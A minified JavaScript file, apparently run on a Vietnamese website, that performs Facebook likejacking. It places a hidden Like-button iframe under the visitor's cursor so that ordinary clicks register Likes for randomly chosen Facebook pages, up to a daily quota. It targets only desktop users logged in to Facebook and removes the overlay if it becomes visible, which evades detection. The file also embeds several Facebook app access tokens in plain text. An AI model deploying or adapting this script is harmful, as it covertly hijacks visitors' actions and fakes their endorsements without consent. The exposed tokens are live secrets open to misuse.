function getRandomFB(t){var e=t.length;if(e>0){var a=Math.floor(Math.random()*e+1)-1;return t[a]}return null}function getFanCount(t){var e="https://graph.facebook.com/v2.8/"+t.fbFP+"?access_token="+t.token+"&fields=fan_count&format=json&method=get";return $.Deferred(function(t){function a(){t.reject(";(")}$.ajax({dataType:"jsonp",url:e}).then(function(e){try{var o=e.fan_count;t.resolve(o)}catch(n){a()}},a)}).promise()}function setIframeSource(t){var e="//www.facebook.com/plugins/like.php?href=https://www.facebook.com/"+t.fbFP+"&amp;send=false&amp;layout=button_count&amp;width=450&amp;show_faces=false&amp;font&amp;colorscheme=light&amp;action=like&amp;height=21";$("#fbIframe").attr("src",e)}var fbItem2={id:2,fbAppId:"1852414374987780",fbFP:"giaythethaogalaxystore",token:"1852414374987780|PcRSPnNQ_DtLTcioC22tuI69Ags",limitPerDay:100,startFanCount:96,startDay:new Date("2016/10/07 00:00:00")},fbItem3={id:3,fbAppId:"1632937030339356",fbFP:"1082841471834558",token:"1632937030339356|1eoodHQzHsx4acL93oUw0VqriSM",limitPerDay:100,startFanCount:166,startDay:new Date("2016/10/07 00:00:00")},fbItem4={id:4,fbAppId:"1712452772412686",fbFP:"TicTaTicTac",token:"1712452772412686|SwY_0ZfY261NtVyxYGYeUa3BYrQ",limitPerDay:100,startFanCount:2576,startDay:new Date("2016/10/07 00:00:00")},fbItem5={id:5,fbAppId:"151111285348009",fbFP:"218628465163364",token:"151111285348009|Zg1PG8eO1x5rWOrjknttMDV6Ftc",limitPerDay:100,startFanCount:2182,startDay:new Date("2016/10/07 00:00:00")},config=[fbItem2,fbItem4,fbItem5],fbRun=getRandomFB(config),remainFan=0,today=new Date,startDay=fbRun.startDay,diff=(today-startDay)/1e3,diff=Math.abs(Math.floor(diff)),days=Math.floor(diff/86400),currentFan=0;getFanCount(fbRun).always(function(t){currentFan=t,setIframeSource(fbRun);var e=!1;(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(navigator.userAgent)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(navigator.userAgent.substr(0,4)))&&(e=!0);var a=days*fbRun.limitPerDay+fbRun.startFanCount-currentFan,o=$("#fbHate");e===!1&&(o.length>0&&a>0?(window.fbAsyncInit=function(){FB.init({appId:fbRun.fbAppId,xfbml:!0,version:"v2.8",status:!0,cookie:!0,frictionlessRequests:!0}),FB.getLoginStatus(function(t){if("connected"===t.status||"not_authorized"===t.status){var e=$.cookie("mtfblike_"+fbRun.id);!e||e.indexOf(fbRun.fbFP).toString()<0?(setIframeSource(fbRun),$(document).mousemove(function(t){o.css({left:t.pageX-15+"px",top:t.pageY-3+"px"}),"fbIframe"==$(document.activeElement).attr("id")&&($.cookie("mtfblike_"+fbRun.id,fbRun.fbFP,{expires:30,path:"/"}),o.remove())})):o.remove()}else o.remove()},!0)},function(t,e,a){var o,n=t.getElementsByTagName(e)[0];t.getElementById(a)||(o=t.createElement(e),o.id=a,o.src="//connect.facebook.net/vi_VN/sdk.js",n.parentNode.insertBefore(o,n))}(document,"script","facebook-jssdk")):0>=a&&o.remove())}),$(function(){$("#fbHate").attrchange({trackValues:!0,callback:function(t){"style"==t.attributeName&&t.newValue.indexOf("opacity: 1").toString()>=0&&$("#fbHate").remove()}})});
